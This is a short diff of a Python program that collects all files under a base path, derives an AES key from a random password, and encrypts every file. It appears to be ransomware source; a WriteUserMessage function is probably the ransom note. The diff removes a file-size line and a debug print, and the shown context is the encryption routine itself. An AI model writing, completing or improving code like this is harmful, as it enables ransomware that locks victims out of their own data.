@@ -32,7 +32,6 @@ def Encrypt(fileToEncrypt, iv, aes_obj):
     return bytesStream
 
 def EncryptFile(fileToEncrypt, key):
-    file_size = str(os.path.getsize(fileToEncrypt)).zfill(16)
     dir_path, file_name = os.path.split(fileToEncrypt)
     iv = secrets.token_bytes(16)
     aes_obj = AES.new(key, AES.MODE_CBC, iv)
@@ -67,7 +66,6 @@ def WriteUserMessage():
 
 def StartEncryption():
     files_to_encrypt = GetAllFiles(base_path)
-    print("files to encrypt: " + str(len(files_to_encrypt)))
     password = ''.join(random.choice(string.ascii_letters + string.digits) for _ in range(32))
     key = SHA256.new(password.encode('utf-8')).digest()
     EncryptAllFiles(files_to_encrypt, key)
